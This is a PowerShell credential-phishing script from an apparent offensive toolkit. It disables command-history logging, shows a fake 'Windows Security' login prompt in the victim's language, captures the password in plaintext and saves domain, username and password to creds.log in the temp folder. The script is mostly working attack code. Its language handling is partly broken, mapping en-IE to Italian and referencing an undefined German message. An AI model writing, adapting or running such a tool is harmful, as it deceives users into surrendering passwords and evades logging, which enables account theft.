<#
.SYNOPSIS
   Prompt the current user for a valid credential.

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.2.6

.DESCRIPTION
   This module spawns a remote 'PromptForCredential' dialogBox
   in the hope that target enters is credentials to leak them.

.NOTES
   Supported languages: pt-PT,en-AU,pt-BZ,pt-BR,en-IE,de-AT,de-FR,eu-ES,nl,nl-BQ

.Parameter PhishCreds
   Accepts arguments: Start (default: Start)

.EXAMPLE
   PS C:\> .\CredsPhish.ps1 -PhishCreds start
   Prompt the current user for a valid credential.

.OUTPUTS
   Domain UserName Password
   ------ -------- --------
   SKYNET pedro    s3cr3t
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$UserAccount=$([Environment]::UserName),
   [string]$PhishCreds="Start"
)


$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

If($PhishCreds -ieq "Start")
{
   Write-Host ""
   ## Supported languages
   $message_ho = "Voer gebruikersgegevens in"
   $message_en = "Please enter user credentials"
   $message_it = "Inserire le credenziali dell'utente"
   $message_ge = "Bitte geben Sie Ihre Anmeldedaten ein"
   $message_pt = "Introduzir as credenciais de utilizador"
   $message_sp = "Por favor, introduzca sus credenciales de usuario"
   $message_fr = "Veuillez saisir les informations d'identification de l'utilisateur"

   ## Get the first installed language with Get-WinUserLanguageList
   # if no supported language is found the script will use English.
   $language = $(Get-WinUserLanguageList)[0].LanguageTag
   If($language -match 'en-AU')
   {
      $message = $message_en
   }
   ElseIf(($language -match 'pt-PT') -or ($language -match 'pt-BZ') -or ($language -match 'pt-BR'))
   {
      $message = $message_pt
   }
   ElseIf($language -match 'en-IE')
   {
      $message = $message_it
   }
   ElseIf($language -match 'de-AT')
   {
      $message = $message_de
   }
   ElseIf($language -match 'de-FR')
   {
      $message = $message_fr
   }
   ElseIf($language -match 'eu-ES')
   {
      $message = $message_sp
   }
   ElseIf(($language -match 'nl') -or ($language -match 'nl-BQ'))
   {
      $message = $message_ho
   }
   Else
   {
      $message = $message_en
   }

   $cred = ($Host.ui.PromptForCredential("Windows Security", "$message", "$Env:USERDOMAIN\$Env:USERNAME",""))
   $username = "$Env:USERNAME";$domain = "$Env:USERDOMAIN";$full = "$domain" + "\" + "$username" -join ''
   $password = $cred.GetNetworkCredential().password

   Add-Type -assemblyname System.DirectoryServices.AccountManagement
   $output = $cred.GetNetworkCredential()|Select-Object Domain,UserName,Password|Format-Table
   echo $output|Out-File "$Env:TMP\creds.log" -encoding ascii -force
}